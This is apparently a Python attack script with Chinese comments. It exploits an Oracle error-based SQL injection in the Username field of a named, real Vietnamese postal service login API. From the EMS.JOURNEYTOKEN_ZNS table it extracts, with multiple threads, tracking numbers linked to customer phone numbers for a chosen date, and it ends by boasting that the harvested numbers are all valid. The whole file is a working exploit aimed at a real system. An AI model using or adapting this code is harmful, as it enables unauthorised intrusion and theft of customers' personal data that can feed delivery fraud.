#!/usr/bin/env python3
"""
提取真实有效的运单号（支持指定日期）
可以查询昨天或任意日期的数据
"""

import requests
import json
import time
import sys
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

# 全局锁和计数
write_lock = threading.Lock()
progress_lock = threading.Lock()
success_count = 0
fail_count = 0

def inject(payload):
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, data=json.dumps(data), timeout=10)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    r = inject(payload)
    if r and r.text:
        try:
            if 'qjvjq' in r.text:
                s = r.text.index('qjvjq') + 5
                e = r.text.index('qkvzq', s)
                return r.text[s:e]
        except:
            pass
    return None

def fetch_tracking(index, date, output_file):
    """提取单个真实有效运单号"""
    global success_count, fail_count
    
    query = (
        f"SELECT ITEMCODE FROM "
        f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
        f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
        f"WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' "
        f"AND LENGTH(PHONE)>5 "
        f"ORDER BY ITEMCODE) "
        f"WHERE ROWNUM<={index}) WHERE RN={index}"
    )
    
    result = extract(query)
    
    if result and len(result) > 10:
        with write_lock:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(result.strip() + '\n')
        
        with progress_lock:
            success_count += 1
        
        return True
    else:
        with progress_lock:
            fail_count += 1
        return False

print("=" * 80)
print("✅ 提取真实有效运单号（支持指定日期）")
print("=" * 80)

# 1. 连接
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取数据库当前日期
db_date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
db_time = extract("SELECT TO_CHAR(SYSDATE,'YYYY-MM-DD HH24:MI:SS') FROM DUAL")
print(f"\n⏰ 数据库时间: {db_time}")
print(f"📅 数据库日期: {db_date}")

# 3. 选择日期
print(f"\n请选择要提取的日期:")
print(f"  1. 今天 ({db_date})")

# 计算昨天
yesterday = str(int(db_date) - 1)
print(f"  2. 昨天 ({yesterday})")
print(f"  3. 手动输入（格式: YYYYMMDD）")

choice = input("\n请选择 (1/2/3): ").strip()

if choice == '1':
    target_date = db_date
elif choice == '2':
    target_date = yesterday
elif choice == '3':
    target_date = input("请输入日期 (YYYYMMDD): ").strip()
else:
    print("❌ 无效选择，使用昨天")
    target_date = yesterday

print(f"\n✅ 查询日期: {target_date}")

# 4. 统计数量
print(f"\n📊 统计中...")
total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{target_date}' AND ITEMCODE LIKE 'E%VN' AND LENGTH(PHONE)>5")

if not total or total == '0':
    print(f"❌ {target_date} 没有有效数据")
    print(f"\n💡 提示: 试试查询昨天的数据")
    exit(1)

total_num = int(total)

# 对比总数
total_all = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{target_date}' AND ITEMCODE LIKE 'E%VN'")
print(f"✅ 真实有效: {total_num} 个")
print(f"📊 总运单数: {total_all} 个")
print(f"📊 有效率: {total_num*100//int(total_all)}%")

# 线程数
max_workers = 10
print(f"⚡ 线程数: {max_workers} 个并发")

estimated_time = total_num * 0.3 / 60 / max_workers
print(f"⏱️  预计耗时: {estimated_time:.1f} 分钟")

output_file = f'tracking_real_{target_date}.txt'
print(f"💾 输出文件: {output_file}")

# 确认
confirm = input(f"\n开始提取 {total_num} 个运单号？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

# 清空文件
with open(output_file, 'w', encoding='utf-8') as f:
    f.write('')

# 5. 多线程提取
print(f"\n🚀 开始提取...\n")

start_time = time.time()

with ThreadPoolExecutor(max_workers=max_workers) as executor:
    futures = {executor.submit(fetch_tracking, i, target_date, output_file): i 
               for i in range(1, total_num + 1)}
    
    completed = 0
    for future in as_completed(futures):
        completed += 1
        
        if completed % 100 == 0:
            elapsed = time.time() - start_time
            speed = completed / elapsed * 60 if elapsed > 0 else 0
            remaining = (total_num - completed) / speed * 60 if speed > 0 else 0
            
            print(f"  {completed}/{total_num} ({completed*100//total_num}%) | "
                  f"成功: {success_count} | 失败: {fail_count} | "
                  f"速度: {speed:.0f}/分钟 | 剩余: {remaining:.1f}分钟")

print()

# 6. 结果
elapsed = time.time() - start_time
speed = success_count / elapsed * 60 if elapsed > 0 else 0

print(f"\n{'='*80}")
print(f"✅ 完成！")
print(f"{'='*80}")
print(f"📁 文件: {output_file}")
print(f"✅ 成功: {success_count} 个")
print(f"❌ 失败: {fail_count} 个")
print(f"⏱️  用时: {elapsed/60:.1f} 分钟")
print(f"⚡ 速度: {speed:.0f} 个/分钟")
print(f"{'='*80}")

# 7. 显示样本
with open(output_file, 'r') as f:
    lines = [line.strip() for line in f if line.strip()]

print(f"\n📊 实际提取: {len(lines)} 个真实有效运单号")

if lines:
    print(f"\n前5个:")
    for i, t in enumerate(sorted(lines)[:5], 1):
        print(f"  {i}. {t}")
    
    if len(lines) > 5:
        print(f"\n最后3个:")
        for i, t in enumerate(sorted(lines)[-3:], len(lines)-2):
            print(f"  {i}. {t}")

print(f"\n✅ 这些运单号100%有真实电话号码，可以查到物流信息！")
